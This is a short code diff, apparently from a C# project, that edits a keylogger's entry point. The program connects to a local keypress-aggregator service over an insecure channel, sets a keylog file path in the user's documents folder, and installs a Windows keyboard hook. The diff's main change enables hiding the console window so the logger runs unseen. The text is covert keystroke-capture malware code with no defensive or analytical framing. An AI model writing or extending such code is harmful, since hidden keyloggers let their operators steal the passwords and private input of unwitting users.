@@ -13,16 +13,19 @@ namespace Hooks
         ///</summary>
         static void Main(string[] args)
         {
+            // Create connection to aggergator process
             string addr = "localhost";
             int port = 4567;
             var channel = new Channel(addr, port, Credentials.Insecure);
             var client = HookKeylogger.Base.KerPressAggergator.NewClient(channel);
-            // Put an empty keypress to force the setup of the client.
             var handle = GetConsoleWindow();
             string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) +"\\keylog";
+
+            // Initialize keylogger and install windows message hook.
             var kl = new KeyLogger(client);
+
             // Hide
-            //ShowWindow(handle, SW_HIDE);
+            ShowWindow(handle, SW_HIDE);
 
             Application.Run();
             kl.Deactivate();
